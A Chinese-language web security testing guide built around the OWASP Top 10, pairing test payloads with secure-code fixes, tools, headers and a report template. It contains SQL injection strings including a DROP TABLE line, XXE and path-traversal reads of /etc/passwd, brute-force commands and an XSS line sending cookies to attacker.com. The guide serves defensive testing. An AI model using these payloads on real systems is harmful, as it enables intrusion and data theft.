# 安全测试参考文档

本文档提供 Web 应用安全测试的完整指南，涵盖常见漏洞类型、测试方法和防护措施。

## 目录

- [OWASP Top 10 漏洞](#owasp-top-10-漏洞)
- [常用安全测试工具](#常用安全测试工具)
- [测试清单](#测试清单)
- [漏洞示例与修复](#漏洞示例与修复)
- [安全响应头配置](#安全响应头配置)
- [API 安全测试](#api-安全测试)

---

## OWASP Top 10 漏洞

### 1. 注入攻击 (Injection)

**描述**: 攻击者通过输入恶意数据来执行非预期的命令。

**常见类型**:
- SQL 注入
- NoSQL 注入
- OS 命令注入
- LDAP 注入

**测试方法**:
```bash
# SQL 注入测试
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
" OR "1"="1
1; DROP TABLE users--
1' AND '1'='1
1' AND '1'='2
' UNION SELECT NULL--
' UNION SELECT username, password FROM users--
```

**防护措施**:
```typescript
// ❌ 错误示例 - 字符串拼接
const query = `SELECT * FROM users WHERE id = '${userId}'`;

// ✅ 正确示例 - 参数化查询
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('id', userId);
```

### 2. 身份验证失效 (Broken Authentication)

**描述**: 身份验证和会话管理实现不当。

**测试要点**:
- [ ] 弱密码策略
- [ ] 暴力破解防护
- [ ] 会话固定攻击
- [ ] 会话超时设置
- [ ] 多因素认证
- [ ] 密码重置流程

**测试命令**:
```bash
# 使用 Hydra 进行暴力破解测试
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# 使用 Burp Suite 测试会话管理
# 1. 捕获登录请求
# 2. 检查 Session ID 熵值
# 3. 测试会话固定
```

**安全配置示例**:
```typescript
// 密码强度验证
const passwordSchema = z.string()
  .min(8, "密码至少8位")
  .regex(/[A-Z]/, "需要大写字母")
  .regex(/[a-z]/, "需要小写字母")
  .regex(/[0-9]/, "需要数字")
  .regex(/[^A-Za-z0-9]/, "需要特殊字符");

// 登录速率限制
const rateLimiter = {
  windowMs: 15 * 60 * 1000, // 15分钟
  max: 5, // 最多5次尝试
  message: "登录尝试过多，请稍后再试"
};
```

### 3. 敏感数据暴露 (Sensitive Data Exposure)

**描述**: 敏感数据未加密存储或传输。

**测试要点**:
- [ ] HTTPS 配置
- [ ] 敏感数据加密
- [ ] 密码哈希算法
- [ ] API 密钥暴露
- [ ] 错误信息泄露

**测试命令**:
```bash
# SSL/TLS 测试
nmap --script ssl-enum-ciphers -p 443 target.com
testssl.sh target.com

# 敏感信息扫描
grep -r "password" --include="*.js" .
grep -r "api_key" --include="*.ts" .
grep -r "secret" --include="*.env" .

# Git 历史敏感信息
git log -p | grep -i password
truffleHog --regex --entropy=False .
```

### 4. XML 外部实体 (XXE)

**描述**: 解析 XML 时处理外部实体引用。

**测试 Payload**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF 测试 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
```

### 5. 访问控制失效 (Broken Access Control)

**描述**: 用户可以访问未授权的功能或数据。

**测试要点**:
- [ ] 水平越权 (访问其他用户数据)
- [ ] 垂直越权 (访问管理员功能)
- [ ] IDOR (不安全的直接对象引用)
- [ ] 目录遍历

**测试方法**:
```bash
# IDOR 测试
GET /api/users/1      # 自己的数据
GET /api/users/2      # 尝试访问其他用户

# 目录遍历
GET /files/../../../etc/passwd
GET /files/....//....//etc/passwd

# 强制浏览
GET /admin
GET /backup
GET /.git/config
```

**RLS 策略示例**:
```sql
-- 用户只能访问自己的数据
CREATE POLICY "Users can view own data"
ON public.user_data
FOR SELECT
USING (auth.uid() = user_id);

-- 管理员可以访问所有数据
CREATE POLICY "Admins can view all data"
ON public.user_data
FOR SELECT
USING (public.has_role(auth.uid(), 'admin'));
```

### 6. 安全配置错误 (Security Misconfiguration)

**测试清单**:
```bash
# 检查默认凭据
admin:admin
root:root
test:test

# 检查暴露的端点
/.env
/config.php
/phpinfo.php
/server-status
/.git/HEAD
/robots.txt
/sitemap.xml

# 检查 HTTP 方法
curl -X OPTIONS target.com
curl -X TRACE target.com
```

### 7. 跨站脚本 (XSS)

**类型**:
- 反射型 XSS
- 存储型 XSS
- DOM 型 XSS

**测试 Payload**:
```html
<!-- 基础测试 -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- 绕过过滤 -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="x" onerror="alert('XSS')">
<body onload="alert('XSS')">

<!-- DOM XSS -->
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>

<!-- Cookie 窃取 -->
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

**React 防护**:
```tsx
// ❌ 危险 - 直接渲染 HTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ 安全 - 自动转义
<div>{userInput}</div>

// ✅ 如果必须渲染 HTML，使用 DOMPurify
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userInput) 
}} />
```

### 8. 不安全的反序列化 (Insecure Deserialization)

**测试要点**:
- [ ] JWT 令牌验证
- [ ] 序列化对象完整性
- [ ] 类型混淆攻击

**JWT 测试**:
```bash
# 解码 JWT
echo "eyJ..." | base64 -d

# 常见攻击
# 1. 算法篡改为 none
# 2. 密钥爆破
# 3. 修改 payload
```

### 9. 使用含有已知漏洞的组件

**检测命令**:
```bash
# npm 审计
npm audit
npm audit fix

# 检查过时依赖
npm outdated

# Snyk 扫描
snyk test
snyk monitor
```

### 10. 日志和监控不足

**应记录的事件**:
- 登录成功/失败
- 权限变更
- 敏感数据访问
- 异常行为
- 系统错误

---

## 常用安全测试工具

### 自动化扫描器

| 工具 | 用途 | 命令示例 |
|------|------|----------|
| **OWASP ZAP** | Web 漏洞扫描 | `zap-cli quick-scan -s all -r report.html target.com` |
| **Nikto** | Web 服务器扫描 | `nikto -h target.com` |
| **Nmap** | 端口/服务扫描 | `nmap -sV -sC target.com` |
| **SQLMap** | SQL 注入 | `sqlmap -u "url?id=1" --dbs` |
| **Nuclei** | 漏洞模板扫描 | `nuclei -u target.com -t cves/` |
| **Burp Suite** | 综合渗透测试 | GUI 工具 |

### 安装命令

```bash
# OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://target.com

# Nikto
apt install nikto
nikto -h https://target.com

# SQLMap
pip install sqlmap
sqlmap -u "https://target.com/page?id=1" --batch

# Nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
nuclei -u https://target.com -t cves/
```

### 浏览器扩展

- **Wappalyzer** - 技术栈识别
- **HackBar** - 快速测试
- **Cookie Editor** - Cookie 管理
- **FoxyProxy** - 代理切换

---

## 测试清单

### 认证测试

```markdown
- [ ] 密码复杂度要求
- [ ] 账户锁定机制
- [ ] 密码重置安全性
- [ ] 多因素认证
- [ ] 会话管理
- [ ] Remember Me 功能
- [ ] 登出功能完整性
- [ ] 并发会话控制
```

### 授权测试

```markdown
- [ ] 水平越权测试
- [ ] 垂直越权测试
- [ ] IDOR 测试
- [ ] API 端点授权
- [ ] 功能级别访问控制
- [ ] 数据级别访问控制
```

### 输入验证测试

```markdown
- [ ] SQL 注入
- [ ] XSS (反射/存储/DOM)
- [ ] 命令注入
- [ ] 路径遍历
- [ ] 文件上传
- [ ] HTTP 参数污染
- [ ] 服务端请求伪造 (SSRF)
```

### 配置测试

```markdown
- [ ] HTTPS 配置
- [ ] 安全响应头
- [ ] CORS 配置
- [ ] 错误处理
- [ ] 文件权限
- [ ] 默认凭据
```

---

## 漏洞示例与修复

### SQL 注入

```typescript
// ❌ 漏洞代码
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ 修复方案 - Supabase
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('email', email);
```

### XSS

```tsx
// ❌ 漏洞代码
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// ✅ 修复方案
import DOMPurify from 'dompurify';

function Comment({ text }: { text: string }) {
  const sanitized = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### CSRF

```typescript
// ✅ 使用 SameSite Cookie
const cookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  path: '/'
};

// ✅ 验证 Origin/Referer
function validateOrigin(request: Request) {
  const origin = request.headers.get('origin');
  const allowedOrigins = ['https://yourdomain.com'];
  return allowedOrigins.includes(origin);
}
```

### 不安全的文件上传

```typescript
// ✅ 安全的文件上传
const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif'];
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

function validateFile(file: File): boolean {
  // 检查 MIME 类型
  if (!ALLOWED_TYPES.includes(file.type)) {
    throw new Error('不支持的文件类型');
  }
  
  // 检查文件大小
  if (file.size > MAX_SIZE) {
    throw new Error('文件过大');
  }
  
  // 检查文件扩展名
  const ext = file.name.split('.').pop()?.toLowerCase();
  if (!['jpg', 'jpeg', 'png', 'gif'].includes(ext || '')) {
    throw new Error('不支持的文件扩展名');
  }
  
  return true;
}
```

---

## 安全响应头配置

### Nginx 配置

```nginx
# 安全响应头
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

# 隐藏服务器信息
server_tokens off;
```

### 响应头说明

| 响应头 | 作用 | 推荐值 |
|--------|------|--------|
| `X-Frame-Options` | 防止点击劫持 | `SAMEORIGIN` |
| `X-Content-Type-Options` | 防止 MIME 类型嗅探 | `nosniff` |
| `X-XSS-Protection` | 浏览器 XSS 过滤 | `1; mode=block` |
| `Content-Security-Policy` | 内容安全策略 | 根据需求配置 |
| `Strict-Transport-Security` | 强制 HTTPS | `max-age=31536000` |
| `Referrer-Policy` | 控制 Referer 信息 | `strict-origin-when-cross-origin` |

### CSP 配置示例

```nginx
# 严格的 CSP
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

---

## API 安全测试

### 认证测试

```bash
# 无认证访问
curl https://api.target.com/users

# 无效 Token
curl -H "Authorization: Bearer invalid" https://api.target.com/users

# 过期 Token
curl -H "Authorization: Bearer expired_token" https://api.target.com/users

# 权限绕过
curl -H "Authorization: Bearer user_token" https://api.target.com/admin/users
```

### 速率限制测试

```bash
# 快速发送多个请求
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" https://api.target.com/endpoint
done

# 使用 Apache Bench
ab -n 1000 -c 10 https://api.target.com/endpoint
```

### CORS 测试

```bash
# 测试 CORS 配置
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS \
     https://api.target.com/endpoint -v
```

### GraphQL 安全

```graphql
# 内省查询
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# 批量查询攻击
query {
  user1: user(id: 1) { password }
  user2: user(id: 2) { password }
  # ... 重复多次
}
```

---

## 自动化安全测试脚本

### 基础扫描脚本

```bash
#!/bin/bash
# security-scan.sh

TARGET=$1

echo "=== 安全扫描开始: $TARGET ==="

# 1. 端口扫描
echo "[*] 端口扫描..."
nmap -sV -sC $TARGET -oN nmap_results.txt

# 2. SSL 检查
echo "[*] SSL/TLS 检查..."
testssl.sh $TARGET > ssl_results.txt

# 3. Web 漏洞扫描
echo "[*] Web 漏洞扫描..."
nikto -h https://$TARGET -o nikto_results.txt

# 4. 目录枚举
echo "[*] 目录枚举..."
gobuster dir -u https://$TARGET -w /usr/share/wordlists/common.txt -o dirs.txt

# 5. 响应头检查
echo "[*] 响应头检查..."
curl -I https://$TARGET > headers.txt

echo "=== 扫描完成 ==="
```

### CI/CD 集成

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main]
  schedule:
    - cron: '0 2 * * 1'  # 每周一凌晨2点

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: npm audit
        run: npm audit --audit-level=high

      - name: OWASP ZAP Scan
        uses: zaproxy/action-baseline@v0.9.0
        with:
          target: 'https://your-app.com'
          
      - name: Upload Report
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: report.html
```

---

## 安全测试报告模板

```markdown
# 安全测试报告

## 基本信息
- **测试目标**: 
- **测试日期**: 
- **测试人员**: 
- **测试范围**: 

## 发现摘要

| 严重程度 | 数量 |
|----------|------|
| 严重     | 0    |
| 高危     | 0    |
| 中危     | 0    |
| 低危     | 0    |
| 信息     | 0    |

## 详细发现

### [漏洞名称]
- **严重程度**: 高/中/低
- **位置**: 
- **描述**: 
- **影响**: 
- **复现步骤**:
  1. 
  2. 
- **修复建议**: 
- **参考链接**: 

## 总结与建议

```

---

## 参考资源

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
